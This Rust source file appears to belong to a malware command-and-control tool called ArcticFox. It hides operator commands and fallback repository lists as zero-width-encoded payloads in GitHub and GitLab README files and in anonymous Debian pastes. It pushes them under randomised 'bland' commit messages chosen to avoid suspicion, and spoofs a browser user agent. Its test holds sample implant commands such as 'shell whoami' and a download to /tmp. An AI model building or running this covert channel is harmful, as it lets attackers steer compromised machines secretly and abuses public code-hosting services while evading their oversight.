//! Repository operations: fetch, push, health-check, paste creation.
//!
//! Async operations using `reqwest` for GitHub, GitLab, and Debian paste APIs.
//! All network errors are properly typed — no bare unwrap or error swallowing.

use rand::Rng;
use reqwest::{Client, StatusCode};
use serde_json::Value;
use std::time::Duration;
use tracing::{debug, info, warn};

use crate::config::{ControlConfig, RepoTarget};
use crate::error::{ArcticFoxError, Result};
use crate::zwcodec;

// ── Constants ───────────────────────────────────────────────────────────────

const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
const REQUEST_TIMEOUT: Duration = Duration::from_secs(30);
const FETCH_TIMEOUT: Duration = Duration::from_secs(15);
const MAX_FETCH_SIZE: usize = 2 * 1024 * 1024; // 2 MB

/// Bland commit messages to avoid suspicion.
const BLAND_COMMITS: &[&str] = &[
    "Update README.md",
    "docs: update readme",
    "fix typo in readme",
    "docs: minor update",
    "update documentation",
    "readme: fix formatting",
    "docs: clarify instructions",
    "update project description",
];

// ── HTTP Client ─────────────────────────────────────────────────────────────

/// Build a reqwest Client with sensible defaults.
pub fn build_client() -> Result<Client> {
    Client::builder()
        .user_agent(USER_AGENT)
        .timeout(REQUEST_TIMEOUT)
        .tcp_nodelay(true)
        .pool_idle_timeout(Duration::from_secs(90))
        .pool_max_idle_per_host(5)
        .build()
        .map_err(|e| ArcticFoxError::Internal {
            message: format!("Failed to build HTTP client: {e}"),
        })
}

// ── Repo Health Check ───────────────────────────────────────────────────────

/// Check if a repo is alive by sending a HEAD request.
pub async fn check_repo_alive(repo: &RepoTarget, client: &Client) -> bool {
    let url = match repo.platform.as_str() {
        "debian" => format!("https://paste.debian.net/plain/{}", repo.repo),
        _ => repo.raw_url(),
    };

    match client.head(&url).send().await {
        Ok(resp) => resp.status().is_success(),
        Err(e) => {
            debug!("Health check failed for {}: {}", repo.label(), e);
            false
        }
    }
}

/// Check all repos, returning results with alive status.
pub async fn check_all_repos(
    repos: &mut [RepoTarget],
    client: &Client,
) -> Vec<(String, bool)> {
    let mut results = Vec::with_capacity(repos.len());
    for repo in repos.iter_mut() {
        let alive = check_repo_alive(repo, client).await;
        repo.alive = alive;
        results.push((repo.label(), alive));
    }
    results
}

// ── Fetching ────────────────────────────────────────────────────────────────

/// Fetch README content from a GitHub repo.
async fn github_fetch_readme(
    repo: &RepoTarget,
    token: &str,
    client: &Client,
) -> Result<(String, Option<String>)> {
    let url = format!(
        "https://api.github.com/repos/{}/{}/contents/{}?ref={}",
        repo.owner, repo.repo, repo.file_path, repo.branch
    );

    let resp = client
        .get(&url)
        .header("Authorization", format!("token {}", token))
        .header("Accept", "application/vnd.github.v3+json")
        .timeout(FETCH_TIMEOUT)
        .send()
        .await
        .map_err(|e| ArcticFoxError::Http {
            url: url.clone(),
            source: e,
        })?;

    if resp.status() == StatusCode::NOT_FOUND {
        return Err(ArcticFoxError::RepoNotFound {
            label: repo.label(),
        });
    }

    let status = resp.status();
    if !status.is_success() {
        let body = resp.text().await.unwrap_or_default();
        return Err(ArcticFoxError::http_status(url, status.as_u16(), body));
    }

    let json: Value = resp.json().await.map_err(|e| ArcticFoxError::Http {
        url: url.clone(),
        source: e,
    })?;
    let content_b64 = json["content"]
        .as_str()
        .ok_or_else(|| ArcticFoxError::Internal {
            message: "GitHub response missing 'content' field".into(),
        })?;

    let content = String::from_utf8(
        base64::Engine::decode(
            &base64::engine::general_purpose::STANDARD,
            content_b64,
        )
        .map_err(|e| ArcticFoxError::Internal {
            message: format!("Base64 decode failed: {e}"),
        })?,
    )
    .map_err(|e| ArcticFoxError::Internal {
        message: format!("Invalid UTF-8 in README: {e}"),
    })?;

    let sha = json["sha"].as_str().map(|s| s.to_string());

    Ok((content, sha))
}

/// Fetch README content from a GitLab repo.
async fn gitlab_fetch_readme(
    repo: &RepoTarget,
    token: &str,
    client: &Client,
) -> Result<String> {
    let project_id = url::form_urlencoded::byte_serialize(
        format!("{}/{}", repo.owner, repo.repo).as_bytes(),
    )
    .collect::<String>();
    let file_path =
        url::form_urlencoded::byte_serialize(repo.file_path.as_bytes()).collect::<String>();
    let url = format!(
        "https://gitlab.com/api/v4/projects/{}/repository/files/{}?ref={}",
        project_id, file_path, repo.branch
    );

    let resp = client
        .get(&url)
        .header("PRIVATE-TOKEN", token)
        .timeout(FETCH_TIMEOUT)
        .send()
        .await
        .map_err(|e| ArcticFoxError::Http {
            url: url.clone(),
            source: e,
        })?;

    if resp.status() == StatusCode::NOT_FOUND {
        return Err(ArcticFoxError::RepoNotFound {
            label: repo.label(),
        });
    }

    let status = resp.status();
    if !status.is_success() {
        let body = resp.text().await.unwrap_or_default();
        return Err(ArcticFoxError::http_status(url, status.as_u16(), body));
    }

    let json: Value = resp.json().await.map_err(|e| ArcticFoxError::Http {
        url: url.clone(),
        source: e,
    })?;
    let content_b64 = json["content"]
        .as_str()
        .ok_or_else(|| ArcticFoxError::Internal {
            message: "GitLab response missing 'content' field".into(),
        })?;

    String::from_utf8(
        base64::Engine::decode(
            &base64::engine::general_purpose::STANDARD,
            content_b64,
        )
        .map_err(|e| ArcticFoxError::Internal {
            message: format!("Base64 decode failed: {e}"),
        })?,
    )
    .map_err(|e| ArcticFoxError::Internal {
        message: format!("Invalid UTF-8 in README: {e}"),
    })
}

/// Fetch content from any repo (raw URL, no auth).
async fn raw_fetch(url: &str, client: &Client) -> Result<String> {
    let cache_bust = format!(
        "{}nocache={}&t={}",
        if url.contains('?') { "&" } else { "?" },
        rand::thread_rng().gen_range(100000..999999),
        chrono::Utc::now().timestamp(),
    );
    let full_url = format!("{}{}", url, cache_bust);

    let resp = client
        .get(&full_url)
        .header("Cache-Control", "no-cache, no-store")
        .header("Pragma", "no-cache")
        .timeout(FETCH_TIMEOUT)
        .send()
        .await
        .map_err(|e| ArcticFoxError::Http {
            url: full_url.clone(),
            source: e,
        })?;

    let status = resp.status();
    if !status.is_success() {
        let body = resp.text().await.unwrap_or_default();
        return Err(ArcticFoxError::http_status(full_url, status.as_u16(), body));
    }

    let bytes = resp
        .bytes()
        .await
        .map_err(|e| ArcticFoxError::Http {
            url: full_url.clone(),
            source: e,
        })?;

    let limited = if bytes.len() > MAX_FETCH_SIZE {
        &bytes[..MAX_FETCH_SIZE]
    } else {
        &bytes
    };

    String::from_utf8(limited.to_vec()).map_err(|e| ArcticFoxError::Internal {
        message: format!("Invalid UTF-8 in fetched content: {e}"),
    })
}

/// Fetch README from a repo, dispatching to the correct method.
pub async fn fetch_readme(
    repo: &RepoTarget,
    config: &ControlConfig,
    client: &Client,
) -> Result<(String, Option<String>)> {
    match repo.platform.as_str() {
        "debian" => {
            let content = raw_fetch(&repo.raw_url(), client).await?;
            Ok((content, None))
        }
        "github" => {
            if config.github_token.is_empty() {
                return Err(ArcticFoxError::MissingApiToken {
                    platform: "github".into(),
                });
            }
            github_fetch_readme(repo, &config.github_token, client).await
        }
        "gitlab" => {
            if config.gitlab_token.is_empty() {
                return Err(ArcticFoxError::MissingApiToken {
                    platform: "gitlab".into(),
                });
            }
            let content = gitlab_fetch_readme(repo, &config.gitlab_token, client).await?;
            Ok((content, None))
        }
        _ => Err(ArcticFoxError::InvalidRepoSpec {
            spec: repo.label(),
            reason: format!("Unknown platform: {}", repo.platform),
        }),
    }
}

// ── Pushing ─────────────────────────────────────────────────────────────────

/// Push README content to a GitHub repo.
async fn github_push_readme(
    repo: &RepoTarget,
    token: &str,
    content: &str,
    sha: Option<&str>,
    client: &Client,
) -> Result<bool> {
    let url = format!(
        "https://api.github.com/repos/{}/{}/contents/{}",
        repo.owner, repo.repo, repo.file_path
    );

    let commit_msg = BLAND_COMMITS[rand::thread_rng().gen_range(0..BLAND_COMMITS.len())];

    let encoded = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        content.as_bytes(),
    );

    let mut body = serde_json::json!({
        "message": commit_msg,
        "content": encoded,
        "branch": repo.branch,
    });

    if let Some(s) = sha {
        body["sha"] = serde_json::Value::String(s.to_string());
    }

    let resp = client
        .put(&url)
        .header("Authorization", format!("token {}", token))
        .header("Accept", "application/vnd.github.v3+json")
        .json(&body)
        .send()
        .await
        .map_err(|e| ArcticFoxError::Http {
            url: url.clone(),
            source: e,
        })?;

    let status = resp.status();
    Ok(status == StatusCode::OK || status == StatusCode::CREATED)
}

/// Push README content to a GitLab repo.
async fn gitlab_push_readme(
    repo: &RepoTarget,
    token: &str,
    content: &str,
    client: &Client,
) -> Result<bool> {
    let project_id = url::form_urlencoded::byte_serialize(
        format!("{}/{}", repo.owner, repo.repo).as_bytes(),
    )
    .collect::<String>();
    let file_path =
        url::form_urlencoded::byte_serialize(repo.file_path.as_bytes()).collect::<String>();
    let url = format!(
        "https://gitlab.com/api/v4/projects/{}/repository/files/{}",
        project_id, file_path
    );

    let commit_msg = BLAND_COMMITS[rand::thread_rng().gen_range(0..BLAND_COMMITS.len())];

    let body = serde_json::json!({
        "branch": repo.branch,
        "content": content,
        "commit_message": commit_msg,
        "encoding": "text",
    });

    let resp = client
        .put(&url)
        .header("PRIVATE-TOKEN", token)
        .json(&body)
        .send()
        .await
        .map_err(|e| ArcticFoxError::Http {
            url: url.clone(),
            source: e,
        })?;

    Ok(resp.status().is_success())
}

/// Push ZW-encoded payload to a repo.
pub async fn push_to_repo(
    repo: &RepoTarget,
    config: &ControlConfig,
    payload: &[u8],
    pad: bool,
    client: &Client,
) -> Result<bool> {
    match repo.platform.as_str() {
        "debian" => {
            let content = "# Project\n\nRepository.\n";
            let injected = zwcodec::inject(content, payload, pad)?;
            let paste_id = DebianPaste::create(&injected, client).await?;
            info!("Created Debian paste: {}", paste_id);
            Ok(true)
        }
        "github" => {
            if config.github_token.is_empty() {
                return Err(ArcticFoxError::MissingApiToken {
                    platform: "github".into(),
                });
            }
            let (content, sha) =
                github_fetch_readme(repo, &config.github_token, client).await?;
            let injected = zwcodec::inject(&content, payload, pad)?;
            github_push_readme(
                repo,
                &config.github_token,
                &injected,
                sha.as_deref(),
                client,
            )
            .await
        }
        "gitlab" => {
            if config.gitlab_token.is_empty() {
                return Err(ArcticFoxError::MissingApiToken {
                    platform: "gitlab".into(),
                });
            }
            let content = gitlab_fetch_readme(repo, &config.gitlab_token, client).await?;
            let injected = zwcodec::inject(&content, payload, pad)?;
            gitlab_push_readme(repo, &config.gitlab_token, &injected, client).await
        }
        _ => Err(ArcticFoxError::InvalidRepoSpec {
            spec: repo.label(),
            reason: format!("Unknown platform: {}", repo.platform),
        }),
    }
}

/// Pull and decode a ZW payload from a repo.
pub async fn pull_from_repo(
    repo: &RepoTarget,
    config: &ControlConfig,
    client: &Client,
) -> Result<Option<Value>> {
    let (content, _sha) = fetch_readme(repo, config, client).await?;

    let raw = match zwcodec::extract(&content) {
        Some(data) => data,
        None => return Ok(None),
    };

    let payload: Value = serde_json::from_slice(&raw).map_err(|e| ArcticFoxError::Json {
        source: e,
    })?;

    Ok(Some(payload))
}

// ── Debian Paste ────────────────────────────────────────────────────────────

/// Debian paste.debian.net operations.
pub struct DebianPaste;

impl DebianPaste {
    /// Create a new paste and return its ID.
    pub async fn create(content: &str, client: &Client) -> Result<String> {
        let params = [
            ("code", content),
            ("poster", "anonymous"),
            ("expire", "-1"),
        ];

        let resp = client
            .post("https://paste.debian.net/")
            .form(&params)
            .send()
            .await
            .map_err(|e| ArcticFoxError::Http {
                url: "https://paste.debian.net/".into(),
                source: e,
            })?;

        let final_url = resp.url().to_string();

        if final_url.contains("paste.debian.net/") && !final_url.contains("/plain/") {
            let paste_id = final_url.trim_end_matches('/').rsplit('/').next();
            match paste_id {
                Some(id) if !id.is_empty() => Ok(id.to_string()),
                _ => Err(ArcticFoxError::PasteCreate {
                    reason: "Could not extract paste ID from URL".into(),
                }),
            }
        } else {
            Err(ArcticFoxError::PasteCreate {
                reason: format!("Unexpected response URL: {}", final_url),
            })
        }
    }
}

// ── Payload Building ────────────────────────────────────────────────────────

/// Build the JSON payload that gets ZW-encoded and pushed to repos.
pub fn build_payload(config: &ControlConfig) -> Vec<u8> {
    let gh_repos: Vec<String> = config
        .repos
        .iter()
        .filter(|r| r.platform == "github")
        .map(|r| format!("{}/{}", r.owner, r.repo))
        .collect();

    let gl_repos: Vec<String> = config
        .repos
        .iter()
        .filter(|r| r.platform == "gitlab")
        .map(|r| format!("{}/{}", r.owner, r.repo))
        .collect();

    let dp_pastes: Vec<String> = config
        .repos
        .iter()
        .filter(|r| r.platform == "debian")
        .map(|r| r.repo.clone())
        .collect();

    let mut payload = serde_json::json!({
        "gh": gh_repos,
        "gl": gl_repos,
        "dp": dp_pastes,
        "cmd": config.commands,
    });

    if !config.heartbeat_redirect.is_empty() && !config.heartbeat_tracking.is_empty() {
        let encoded_target =
            url::form_urlencoded::byte_serialize(config.heartbeat_tracking.as_bytes())
                .collect::<String>();
        let hb_url = config
            .heartbeat_redirect
            .replace("{target}", &encoded_target);
        payload["hb"] = serde_json::json!({
            "url": hb_url,
            "sec": config.heartbeat_interval,
        });
    }

    serde_json::to_vec(&payload).unwrap_or_default()
}

// ── Repo Spec Parsing ──────────────────────────────────────────────────────

/// Parse a repo spec string into a `RepoTarget`.
///
/// Formats:
///   - `owner/repo` → GitHub (default)
///   - `gh:owner/repo` → GitHub explicit
///   - `gl:owner/repo` → GitLab
///   - `dp:paste_id` or `debian:paste_id` → Debian paste
///   - `owner/repo:branch` → Custom branch
///   - `gl:owner/repo:main/path/file.md` → Custom branch + file path
pub fn parse_repo_spec(spec: &str) -> Result<RepoTarget> {
    let spec = spec.trim();

    // Debian paste
    if spec.starts_with("dp:") || spec.starts_with("debian:") {
        let paste_id = spec.split_once(':').map(|(_, id)| id.trim()).unwrap_or("");
        if paste_id.is_empty() {
            return Err(ArcticFoxError::InvalidRepoSpec {
                spec: spec.into(),
                reason: "Empty paste ID".into(),
            });
        }
        return Ok(RepoTarget {
            owner: String::new(),
            repo: paste_id.into(),
            platform: "debian".into(),
            branch: String::new(),
            file_path: String::new(),
            alive: true,
        });
    }

    let (platform, remainder) = if spec.starts_with("gl:") || spec.starts_with("gitlab:") {
        ("gitlab", spec.split_once(':').map(|(_, r)| r).unwrap_or(""))
    } else if spec.starts_with("gh:") || spec.starts_with("github:") {
        ("github", spec.split_once(':').map(|(_, r)| r).unwrap_or(""))
    } else {
        ("github", spec)
    };

    if remainder.is_empty() {
        return Err(ArcticFoxError::InvalidRepoSpec {
            spec: spec.into(),
            reason: "Missing repo path".into(),
        });
    }

    let (repo_part, branch, file_path) = if let Some((rp, rest)) = remainder.split_once(':') {
        if rest.contains('/') {
            let (br, fp) = rest.split_once('/').unwrap_or((rest, "README.md"));
            (rp, br, fp)
        } else {
            (rp, rest, "README.md")
        }
    } else {
        (remainder, "main", "README.md")
    };

    let parts: Vec<&str> = repo_part.split('/').collect();
    if parts.len() != 2 {
        return Err(ArcticFoxError::InvalidRepoSpec {
            spec: spec.into(),
            reason: format!(
                "Expected 'owner/repo' format, got '{}'",
                repo_part
            ),
        });
    }

    Ok(RepoTarget {
        owner: parts[0].into(),
        repo: parts[1].into(),
        platform: platform.into(),
        branch: branch.into(),
        file_path: file_path.into(),
        alive: true,
    })
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_github_default() {
        let r = parse_repo_spec("user/repo").unwrap();
        assert_eq!(r.platform, "github");
        assert_eq!(r.owner, "user");
        assert_eq!(r.repo, "repo");
        assert_eq!(r.branch, "main");
    }

    #[test]
    fn parse_github_explicit() {
        let r = parse_repo_spec("gh:user/repo").unwrap();
        assert_eq!(r.platform, "github");
        assert_eq!(r.owner, "user");
    }

    #[test]
    fn parse_gitlab() {
        let r = parse_repo_spec("gl:user/repo").unwrap();
        assert_eq!(r.platform, "gitlab");
        assert_eq!(r.owner, "user");
        assert_eq!(r.branch, "main");
    }

    #[test]
    fn parse_debian_paste() {
        let r = parse_repo_spec("dp:12345abc").unwrap();
        assert_eq!(r.platform, "debian");
        assert_eq!(r.repo, "12345abc");
    }

    #[test]
    fn parse_with_branch() {
        let r = parse_repo_spec("user/repo:develop").unwrap();
        assert_eq!(r.branch, "develop");
    }

    #[test]
    fn parse_with_branch_and_file() {
        let r = parse_repo_spec("user/repo:dev/docs/CHANGES.md").unwrap();
        assert_eq!(r.branch, "dev");
        assert_eq!(r.file_path, "docs/CHANGES.md");
    }

    #[test]
    fn parse_invalid_format() {
        assert!(parse_repo_spec("justoneword").is_err());
        assert!(parse_repo_spec("a/b/c").is_err());
        assert!(parse_repo_spec("").is_err());
    }

    #[test]
    fn build_payload_contains_commands() {
        let config = ControlConfig {
            commands: vec!["shell whoami".into(), "download http://x.com/a /tmp/a".into()],
            ..Default::default()
        };
        let payload = build_payload(&config);
        let json: Value = serde_json::from_slice(&payload).unwrap();
        let cmds: Vec<String> = serde_json::from_value(json["cmd"].clone()).unwrap();
        assert_eq!(cmds.len(), 2);
        assert!(cmds.contains(&"shell whoami".to_string()));
    }
}
